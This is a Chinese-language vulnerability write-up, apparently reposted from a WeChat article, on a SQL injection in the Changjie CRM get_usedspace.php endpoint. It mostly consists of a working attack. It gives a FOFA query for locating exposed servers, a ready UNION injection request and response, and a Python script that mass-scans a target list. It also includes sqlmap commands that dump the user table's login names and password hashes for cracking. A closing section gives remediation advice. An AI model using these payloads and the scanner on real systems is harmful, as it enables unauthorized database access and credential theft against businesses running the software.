> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/MW9WSSaye8ARGXICBTqoxw)

免责申明：**本文仅供技术学习参考，请勿用作违法用途，任何个人和组织利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责！！！**

一、漏洞名称

畅捷 CRM get_usedspace.php SQL 注入漏洞

二、漏洞影响

畅捷 CRM

![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BM03iaJI15BvAavxeKTvFu3ZyYibkfKtrQ1N3S31TyXjh8Q5mic3DDbd5n1mgetMMxI9K2icJTxjU42cw/640?wx_fmt=png)

三、漏洞描述

畅捷 CRM 是面向小企业全力打造的简单、实用的客户关系管理应用! 畅捷 CRM 帮助企业用好自己的客户资源、管好商机跟进过程、引导好业务员跟单行为。系统 /WebSer~1/get_usedspace.php 接口处存在 SQL 注入漏洞，攻击者通过恶意构造的 SQL 查询来执行未经授权的数据库操作。当应用程序未能正确验证、转义或过滤用户提供的输入数据时，攻击者可以利用这个漏洞来执行恶意的 SQL 语句，从而获取系统数据以及获得系统控制权限。

四、资产 FOFA 搜索语句

```
title="畅捷CRM"

```

五、漏洞复现  

向目标发送如下请求数据包  

```
GET /WebSer~1/get_usedspace.php?site_id=-1159%20UNION%20ALL%20SELECT%20CONCAT(0x7178767671,0x5664726e476a637a565a50614d4c435745446a50614756506d486d58544b4e646d7a577170685165,0x7171626b71)-- HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close

```

响应数据包如下，body 中包含了执行结果

```
HTTP/1.1 200 OK
Date: Fri, 15 Sep 2023 10:09:33 GMT
Server: Apache/2.2.6 (Win32) PHP/5.2.10
X-Powered-By: PHP/5.2.10
Set-Cookie: PHPSESSID=79c6ba39448dd8a73c3c2a9f85a07173; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Content-Length: 67
Connection: close
Content-Type: text/html; charset=utf-8
<result>qxvvqVdrnGjczVZPaMLCWEDjPaGVPmHmXTKNdmzWqphQeqqbkq</result>

```

证明 **SQL 注入漏洞**洞存在  

六、批量漏洞检测

该 python 脚本可以批量检测漏洞，C:\Users\DELL\Desktop\1.txt 为输入目标文件，每行是一个 url

```
import argparse
import time
import requests
from urllib.parse import urlsplit
# 读取URL文件，处理url
def get_url(file):
    with open('{}'.format(file),'r',encoding='utf-8') as f:
        for url in f:
            url = url.replace('\n', '')
            if "http" not in url:
                url = "http://" + url
            parsed_url = urlsplit(url)
            base_url = parsed_url.scheme + "://" + parsed_url.netloc
            send_req(base_url)
# 在文件中记录存在漏洞的url            
def write_result(content):
    f = open("result.txt", "a", encoding="UTF-8")
    f.write('{}\n'.format(content))
    f.close()
# 发送POC数据包请求
def send_req(url_check):
    print('{} runing Check'.format(url_check))
    url = url_check + '/WebSer~1/get_usedspace.php?site_id=-1159%20UNION%20ALL%20SELECT%20CONCAT(0x7178767671,0x5664726e476a637a565a50614d4c435745446a50614756506d486d58544b4e646d7a577170685165,0x7171626b71)--'
    header = {
        'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding':'gzip, deflate',
        'Upgrade-Insecure-Requests':'1',
        'Sec-Fetch-Dest':'document',
        'Sec-Fetch-Mode':'navigate',
        'Sec-Fetch-Site':'none',
        'Sec-Fetch-User':'?1',
        'Te':'trailers',
        'Connection':'close'
    }
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(url=url,headers=header,verify=False,timeout=30)
        # 打印响应数据包
        print(f"HTTP/1.1 {response.status_code} {response.reason}")
        for key, value in response.headers.items():
            print(f"{key}: {value}")
        print()
        print(response.text)
        if response.status_code == 200 and "qxvvqVdrnGjczVZPaMLCWEDjPaGVPmHmXTKNdmzWqphQeqqbkq" in response.text:
            result = '{} 存在畅捷CRM SQL 注入漏洞\n'.format(url_check)
            print(result)
            write_result(result)
        time.sleep(1)
    except Exception as e:
        print(e)
        pass
if __name__ == '__main__':
    file = r"C:\Users\DELL\Desktop\1.txt"
    get_url(file)

```

七、漏洞利用

使用 sqlmap 获取数据库列表

```
sqlmap -u "http://x.x.x.x:xx/WebSer~1/get_usedspace.php?site_id=1" --dbs

```

![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BOfqwkwml84pnvHN3Xwyy1QSn106WFk2pfE6m22m4SDJCLFjWQIDgoW1xnxaRmZrnjR2rGJjZhLiag/640?wx_fmt=png)

使用 sqlmap 获取数据库表名

```
sqlmap -u "http://x.x.x.x:xx/WebSer~1/get_usedspace.php?site_id=1" -D crmsaas_plus --tables

```

![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BOfqwkwml84pnvHN3Xwyy1Qf3lIuwthmxhe1B2qTyTtliaW8EUuyDHJcTwKRZhofszKCkdhga4HTiaA/640?wx_fmt=png)

使用 sqlmap 获取系统用户名密码，通过 sqlmap MD5 解密即可得到明文密码

```
sqlmap -u "http://x.x.x.x:xx/WebSer~1/get_usedspace.php?site_id=1" -D crmsaas_plus -T tc_user -C login_name,login_password -dump

```

![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BM03iaJI15BvAavxeKTvFu3ZKUWib81a15cVkiamQ24a6P5yLnp7TDRv5UyzdVRE7dia1N63gnU70dLKw/640?wx_fmt=png)

八、漏洞修复

1. 使用参数化查询：最有效的方法是使用参数化查询（也称为预编译语句或绑定变量）。这样可以将用户输入的数据与 SQL 查询分开，从而防止攻击者注入恶意 SQL 代码。具体来说，使用编程语言或框架提供的参数化查询方法，而不是手动拼接 SQL 字符串。

2. 输入验证和过滤：对于不适合参数化查询的情况，可以在接受用户输入之前进行严格的输入验证和过滤。只允许合法的字符和数据类型，并拒绝特殊字符，这可以减少注入的风险。

3.ORM（对象关系映射）：使用 ORM 工具，例如 Django 的 ORM 或 SQLAlchemy，可以自动处理参数化查询，从而减少手动编写 SQL 的机会。

4. 最小权限原则：确保数据库用户只有执行必要操作的权限。不要为 Web 应用程序使用具有超级管理员权限的数据库用户。

5. 错误处理：如果在处理 SQL 查询时发生错误，不要将详细错误信息返回给用户。错误信息可能包含有关数据库结构的敏感信息。应该将错误信息记录到日志中，而不是将其显示给用户。

6. 安全开发实践：教育开发人员关于 SQL 注入漏洞的风险以及如何防止它们。定期进行代码审查和安全测试，以发现并修复潜在的漏洞。

7.Web 应用程序防火墙（WAF）：使用 WAF 可以帮助检测和阻止 SQL 注入攻击，但不应该仅依赖 WAF 来防止漏洞。